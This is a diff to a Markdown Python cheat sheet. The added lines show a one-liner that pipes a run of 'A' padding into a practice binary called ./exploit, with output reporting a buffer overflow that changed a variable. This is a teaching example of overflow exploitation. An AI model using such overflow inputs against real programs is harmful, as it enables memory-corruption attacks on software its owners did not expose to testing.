@@ -22,6 +22,12 @@ $> python print.py argument "with quotes"    and    spaces
 ['hello.py', 'argument', 'with quotes', 'and', 'spaces']
 ```
 
+You can also execute a single line of python to exploit a specific binary:
+```sh
+$> python -c 'print "A"*(4+16*3+14)' | ./exploit
+Congratulation, you changed the variable, using a buffer overflow technique.
+```
+
 ## Conversions
 
 | From  | To    | Code                     | Result      |
